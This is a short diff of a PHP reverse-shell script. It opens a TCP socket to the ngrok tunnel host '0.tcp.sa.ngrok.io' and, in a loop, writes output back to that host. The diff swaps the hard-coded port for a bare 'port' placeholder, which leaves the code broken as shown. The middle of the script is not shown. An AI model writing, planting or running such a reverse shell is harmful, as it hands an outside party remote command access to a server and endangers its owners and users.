@@ -1,6 +1,6 @@
 <?php
 $host = '0.tcp.sa.ngrok.io'; 
-$port = 15257; 
+$port = port; 
 
 $sock = socket_create(AF_INET, SOCK_STREAM, 0);
 socket_connect($sock, $host, $port);
@@ -16,4 +16,3 @@ while (true) {
     socket_write($sock, $output);
 }
 ?>
-
